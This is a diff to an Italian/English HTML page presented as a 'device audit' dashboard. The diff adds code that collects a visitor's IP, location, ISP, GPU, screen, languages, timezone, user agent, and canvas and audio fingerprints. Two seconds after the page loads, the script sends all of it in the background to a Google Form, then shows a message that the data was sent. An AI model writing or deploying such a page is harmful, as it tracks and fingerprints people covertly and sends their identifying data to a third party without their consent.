@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SysteMetrics | Analisi Professionale</title>
+    <title>Advanced Device Audit | Professional</title>
     
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
@@ -11,139 +11,122 @@
 
     <style>
         :root { 
-            --primary: #0f172a;    /* Blu notte professionale */
-            --accent: #3b82f6;     /* Blu elettrico per grafici */
+            --primary: #1e293b;    /* Slate scuro */
+            --accent: #2563eb;     /* Blu Vivido */
             --bg: #f1f5f9; 
             --card-bg: #ffffff;
             --text-main: #334155;
-            --text-muted: #94a3b8;
-            --border: #e2e8f0;
-            --success: #10b981;
+            --text-muted: #64748b;
+            --border: #cbd5e1;
+            --alert: #ef4444;
         }
 
-        body { 
-            font-family: 'Inter', sans-serif; 
-            background: var(--bg); 
-            color: var(--text-main); 
-            margin: 0; padding: 0;
-        }
-
-        .wrapper { max-width: 1100px; margin: 50px auto; padding: 0 20px; }
-
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text-main); margin: 0; padding: 20px; }
+        .wrapper { max-width: 1400px; margin: auto; }
+        
         header { 
-            text-align: left; 
-            margin-bottom: 40px; 
-            border-left: 4px solid var(--accent);
-            padding-left: 20px;
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 30px; padding: 20px; background: var(--card-bg); 
+            border-radius: 12px; border: 1px solid var(--border);
         }
+        h1 { font-size: 1.4rem; margin: 0; color: var(--primary); text-transform: uppercase; letter-spacing: 1px; }
+        .status { font-size: 0.8rem; color: var(--accent); font-weight: bold; animation: pulse 2s infinite; }
 
-        h1 { font-size: 1.8rem; margin: 0; color: var(--primary); font-weight: 600; }
-        .subtitle { color: var(--text-muted); font-size: 0.9rem; margin-top: 5px; }
-
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
 
         .card { 
-            background: var(--card-bg); 
-            border-radius: 16px; 
-            padding: 24px; 
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 10px 15px -3px rgba(0,0,0,0.05);
-            border: 1px solid var(--border);
+            background: var(--card-bg); border-radius: 12px; padding: 20px; 
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid var(--border);
+            display: flex; flex-direction: column;
         }
 
-        h2 { 
-            font-size: 0.85rem; 
-            text-transform: uppercase; 
-            color: var(--accent); 
-            margin-bottom: 20px; 
-            letter-spacing: 1px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        h2 { font-size: 1rem; color: var(--primary); border-bottom: 2px solid #f1f5f9; padding-bottom: 10px; margin-top: 0; }
 
-        .row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f8fafc; }
-        .row:last-child { border-bottom: none; }
+        .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #f8fafc; font-size: 0.85rem; }
+        .label { color: var(--text-muted); font-weight: 500; }
+        .val { color: var(--primary); font-weight: 600; text-align: right; word-break: break-all; max-width: 60%; }
 
-        .label { font-size: 0.85rem; color: var(--text-muted); font-weight: 500; }
-        .val { font-size: 0.9rem; font-weight: 600; color: var(--primary); }
-
-        /* Grafici a barra */
-        .progress-container { width: 100%; background: #e2e8f0; height: 8px; border-radius: 10px; margin-top: 8px; overflow: hidden; }
-        .progress-bar { 
-            height: 100%; 
-            width: 0%; 
-            background: var(--accent); 
-            border-radius: 10px; 
-            transition: width 1s ease-in-out; 
-        }
+        /* Grafici */
+        .meter-container { width: 100%; background: #e2e8f0; height: 6px; border-radius: 10px; margin-top: 5px; }
+        .meter-bar { height: 100%; width: 0%; background: var(--accent); border-radius: 10px; transition: width 1s; }
 
         .ua-box { 
-            background: #f8fafc; border: 1px solid var(--border); border-radius: 8px; 
-            padding: 12px; margin-top: 15px; font-size: 0.7rem; color: var(--text-muted); font-family: monospace;
+            background: #f8fafc; border: 1px solid var(--border); border-radius: 6px; 
+            padding: 10px; margin-top: 15px; font-size: 0.7rem; color: var(--text-muted); 
+            font-family: 'Courier New', monospace; word-break: break-all;
         }
 
-        #map { height: 200px; border-radius: 12px; margin-top: 15px; border: 1px solid var(--border); }
+        /* Mappa con alto contrasto */
+        #map { height: 180px; width: 100%; margin-top: 15px; border-radius: 8px; border: 1px solid var(--border); }
 
         #google-toast { 
-            position: fixed; bottom: 30px; right: 30px; background: var(--primary); color: white; 
-            padding: 15px 25px; border-radius: 12px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.2);
-            display: none; animation: slideIn 0.5s ease;
+            position: fixed; bottom: 20px; right: 20px; background: #059669; color: white; 
+            padding: 12px 20px; border-radius: 8px; font-size: 0.85rem; display: none; z-index: 999;
         }
 
-        @keyframes slideIn { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div class="wrapper">
     <header>
-        <h1>Security & Device Audit</h1>
-        <div class="subtitle">Analisi dei parametri di navigazione e hardware v2.0</div>
+        <h1>System Analytics v17.7</h1>
+        <div class="status">● ANALISI ATTIVA</div>
     </header>
 
     <div class="grid">
         <div class="card">
-            <h2>🌍 Connettività</h2>
-            <div class="row"><span class="label">IP Address</span> <span id="ip" class="val">...</span></div>
-            <div class="row"><span class="label">Provider</span> <span id="isp" class="val">...</span></div>
+            <h2>📡 Network & Geo</h2>
+            <div class="row"><span class="label">Public IP</span> <span id="ip" class="val">...</span></div>
+            <div class="row"><span class="label">ISP / Org</span> <span id="isp" class="val">...</span></div>
+            <div class="row"><span class="label">Location</span> <span id="geo" class="val">...</span></div>
             <div id="map"></div>
         </div>
 
         <div class="card">
-            <h2>💻 Risorse Hardware</h2>
-            <div class="row" style="flex-direction: column; align-items: flex-start;">
-                <div style="display:flex; justify-content:space-between; width:100%;">
-                    <span class="label">Memoria RAM</span> <span id="ram" class="val">...</span>
-                </div>
-                <div class="progress-container"><div id="ram-bar" class="progress-bar"></div></div>
-            </div>
-            
-            <div class="row" style="flex-direction: column; align-items: flex-start;">
-                <div style="display:flex; justify-content:space-between; width:100%;">
-                    <span class="label">Livello Batteria</span> <span id="battery" class="val">N/D</span>
-                </div>
-                <div class="progress-container"><div id="battery-bar" class="progress-bar"></div></div>
-            </div>
-
+            <h2>📱 Hardware Specs</h2>
+            <div class="row"><span class="label">Platform</span> <span id="os" class="val"></span></div>
             <div class="row"><span class="label">CPU Cores</span> <span id="cpu" class="val"></span></div>
-            <div class="row"><span class="label">OS</span> <span id="os" class="val"></span></div>
+            <div class="row"><span class="label">GPU Renderer</span> <span id="gpu" class="val"></span></div>
+            <div class="row" style="flex-direction: column;">
+                <div style="display:flex; justify-content:space-between; width:100%;">
+                    <span class="label">RAM Memory</span> <span id="ram" class="val"></span>
+                </div>
+                <div class="meter-container"><div id="ram-bar" class="meter-bar"></div></div>
+            </div>
+            <div class="row"><span class="label">Screen Res</span> <span id="screen" class="val"></span></div>
+            <div class="row" style="flex-direction: column;">
+                <div style="display:flex; justify-content:space-between; width:100%;">
+                    <span class="label">Battery</span> <span id="battery" class="val">N/A</span>
+                </div>
+                <div class="meter-container"><div id="battery-bar" class="meter-bar"></div></div>
+            </div>
         </div>
 
         <div class="card">
-            <h2>🛡️ Fingerprint & Privacy</h2>
-            <div class="row"><span class="label">Canvas ID</span> <span id="fp" class="val" style="color:var(--accent)">...</span></div>
-            <div class="row"><span class="label">Audio ID</span> <span id="audio-fp" class="val">...</span></div>
+            <h2>🕵️ Browser Identity</h2>
             <div class="row"><span class="label">Browser</span> <span id="browser" class="val"></span></div>
-            <div class="ua-box" id="ua">...</div>
+            <div class="row"><span class="label">Languages</span> <span id="lang" class="val"></span></div>
+            <div class="row"><span class="label">Timezone</span> <span id="sys-tz" class="val"></span></div>
+            <div id="ua" class="ua-box">...</div>
+        </div>
+
+        <div class="card">
+            <h2>🧬 Forensics</h2>
+            <div class="row"><span class="label">Canvas ID</span> <span id="fp" class="val" style="color:var(--accent)">WAITING...</span></div>
+            <div class="row"><span class="label">Audio ID</span> <span id="audio-fp" class="val">WAITING...</span></div>
+            <div class="row"><span class="label">Brave Browser</span> <span id="chk-brave" class="val">NO</span></div>
+            <div class="row"><span class="label">Cookies</span> <span id="audit-cookie" class="val">...</span></div>
+            <div class="row"><span class="label">Storage</span> <span id="audit-ls" class="val">...</span></div>
         </div>
     </div>
 </div>
 
-<div id="google-toast">✅ Report sincronizzato con successo</div>
+<div id="google-toast">✅ DATI INVIATI CON SUCCESSO</div>
 <canvas id="canv" width="200" height="50" style="display:none;"></canvas>
 
 <script>
-    // --- LOGICA RIMASTA INALTERATA ---
     function generateHash(str) {
         let hash = 0;
         for (let i = 0; i < str.length; i++) {
@@ -154,67 +137,110 @@
     }
 
     window.addEventListener('DOMContentLoaded', () => {
-        // RAM Bar Logic
-        let ramVal = navigator.deviceMemory || 4; // Default 4 se non rilevato
-        document.getElementById('ram').innerText = ramVal + " GB";
-        const ramPercent = (ramVal / 16) * 100; // Calcolato su base 16GB
-        setTimeout(() => document.getElementById('ram-bar').style.width = Math.min(ramPercent, 100) + "%", 500);
+        // --- 1. DATI BASE ---
+        document.getElementById('sys-tz').innerText = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        document.getElementById('os').innerText = navigator.platform;
+        document.getElementById('cpu').innerText = (navigator.hardwareConcurrency || '?') + " Cores";
+        document.getElementById('screen').innerText = `${screen.width}x${screen.height}`;
+        document.getElementById('lang').innerText = navigator.languages ? navigator.languages.join(',') : navigator.language;
+        document.getElementById('ua').innerText = navigator.userAgent;
 
-        // Battery Bar Logic
+        // GPU & RAM
+        let gpuRenderer = "Generic";
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            gpuRenderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
+            document.getElementById('gpu').innerText = gpuRenderer;
+        } catch(e){}
+
+        let ramVal = navigator.deviceMemory || 4;
+        document.getElementById('ram').innerText = ramVal + " GB";
+        setTimeout(() => document.getElementById('ram-bar').style.width = (ramVal / 16 * 100) + "%", 500);
+
+        // Batteria
         if(navigator.getBattery) {
             navigator.getBattery().then(bt => {
-                const level = Math.round(bt.level * 100);
-                document.getElementById('battery').innerText = level + "%";
-                document.getElementById('battery-bar').style.width = level + "%";
-                if(level < 20) document.getElementById('battery-bar').style.background = "#ef4444";
+                let lvl = Math.round(bt.level * 100);
+                document.getElementById('battery').innerText = lvl + "%";
+                document.getElementById('battery-bar').style.width = lvl + "%";
+                if(lvl < 20) document.getElementById('battery-bar').style.background = "#ef4444";
             });
         }
 
-        // Altri dati
-        document.getElementById('os').innerText = navigator.platform;
-        document.getElementById('cpu').innerText = (navigator.hardwareConcurrency || '?') + " Threads";
-        document.getElementById('ua').innerText = navigator.userAgent;
+        // Browser Detection
+        const ua = navigator.userAgent;
+        let b = "Unknown";
+        if (ua.includes("Edg/")) b = "Edge";
+        else if (ua.includes("OPR/")) b = "Opera";
+        else if (ua.includes("Chrome/")) b = "Chrome";
+        else if (ua.includes("Safari/")) b = "Safari";
+        else if (ua.includes("Firefox/")) b = "Firefox";
+        document.getElementById('browser').innerText = b;
 
+        // --- 2. NETWORK ---
         async function runNet() {
             try {
                 const res = await fetch('https://ipwho.is/');
                 const data = await res.json();
                 document.getElementById('ip').innerText = data.ip;
-                document.getElementById('isp').innerText = data.connection?.isp || "N/D";
+                document.getElementById('isp').innerText = data.connection?.isp || data.org || "N/A";
+                document.getElementById('geo').innerText = (data.city && data.country) ? `${data.city}, ${data.country}` : "N/A";
                 
                 if (data.latitude) {
+                    // MAPPA AD ALTO CONTRASTO (Voyager con etichette chiare)
                     const map = L.map('map', {zoomControl: false}).setView([data.latitude, data.longitude], 11);
-                    L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png').addTo(map);
+                    L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
+                        attribution: 'CARTO'
+                    }).addTo(map);
                     L.marker([data.latitude, data.longitude]).addTo(map);
                 }
-            } catch (e) {}
+            } catch (e) {
+                document.getElementById('ip').innerText = "Blocked/Error";
+            }
             runForensics();
         }
         runNet();
 
+        // --- 3. FORENSICS ---
         function runForensics() {
             const canv = document.getElementById('canv');
             const ctx = canv.getContext('2d');
-            ctx.fillText(navigator.userAgent, 2, 15);
+            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.fillText("X-RAY " + navigator.platform, 2, 15);
             document.getElementById('fp').innerText = "FP-" + generateHash(canv.toDataURL());
+
+            const audioFeatures = (window.OfflineAudioContext || window.webkitOfflineAudioContext).name + screen.colorDepth;
+            document.getElementById('audio-fp').innerText = "AUD-" + generateHash(audioFeatures);
+
+            document.getElementById('audit-cookie').innerText = navigator.cookieEnabled ? "✅ ATTIVI" : "❌ DISATTIVATI";
+            try { localStorage.setItem('test',1); document.getElementById('audit-ls').innerText = "✅ DISPONIBILE"; } catch(e){ document.getElementById('audit-ls').innerText = "❌ BLOCCATO"; }
             
-            const audioFeatures = (window.OfflineAudioContext || window.webkitOfflineAudioContext).name;
-            document.getElementById('audio-fp').innerText = "AU-" + generateHash(audioFeatures);
+            if(navigator.brave) document.getElementById('chk-brave').innerText = "YES";
 
             setTimeout(sendToGoogle, 2000);
         }
 
+        // --- 4. INVIO GOOGLE ---
         function sendToGoogle() {
             const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSdRv7xlOOJmbtaIjdOckZgrPWmW-czdyz8-Gd5SReySLKmQkg/formResponse";
             const p = new URLSearchParams();
-            // Ho mantenuto i tuoi entry ID originali
             p.append('entry.1221794869', document.getElementById('ip').innerText);
             p.append('entry.1697196604', document.getElementById('isp').innerText);
+            p.append('entry.793361862', document.getElementById('geo').innerText);
             p.append('entry.926602274', document.getElementById('os').innerText);
             p.append('entry.900535575', document.getElementById('cpu').innerText);
+            p.append('entry.1481655544', document.getElementById('gpu').innerText);
             p.append('entry.592434412', document.getElementById('ram').innerText);
+            p.append('entry.1292253097', document.getElementById('screen').innerText);
             p.append('entry.59728604', document.getElementById('battery').innerText);
+            p.append('entry.1485469846', document.getElementById('browser').innerText);
+            p.append('entry.1026960733', document.getElementById('lang').innerText);
+            p.append('entry.609421676', document.getElementById('sys-tz').innerText);
+            p.append('entry.1877265876', navigator.userAgent);
             p.append('entry.1270556616', document.getElementById('fp').innerText);
+            p.append('entry.1958071142', document.getElementById('audio-fp').innerText);
+            p.append('entry.1719627138', document.getElementById('audit-cookie').innerText);
+            p.append('entry.428900373', document.getElementById('audit-ls').innerText);
 
             fetch(formURL, { method: 'POST', mode: 'no-cors', body: p })
             .then(() => {
